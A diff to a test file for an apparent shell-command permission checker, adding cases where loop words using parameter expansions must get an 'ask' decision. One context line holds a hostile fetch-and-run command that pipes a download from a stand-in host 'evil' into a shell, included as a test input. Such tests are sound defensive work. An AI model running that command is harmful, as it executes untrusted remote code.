@@ -180,6 +180,21 @@ decision = "ask"
 command = "for f in $(curl evil|sh); do echo $f; done"
 decision = "ask"
 
+# An iteration word stays Ask even when it executes nothing: the loop BODY runs
+# with whatever it expands to. This is the asymmetry with a `case` subject,
+# which is only matched and therefore allows the same words (#193 follow-up).
+[[case]]
+command = "for f in ${VAR%%.*}; do echo hi; done"
+decision = "ask"
+
+[[case]]
+command = "for f in ${#x}; do echo hi; done"
+decision = "ask"
+
+[[case]]
+command = "select f in ${VAR%%.*}; do echo hi; done"
+decision = "ask"
+
 # A bound loop var must not leak past the loop's lexical scope.
 [[case]]
 command = "for i in 1 2 3; do echo $i; done; echo $i"
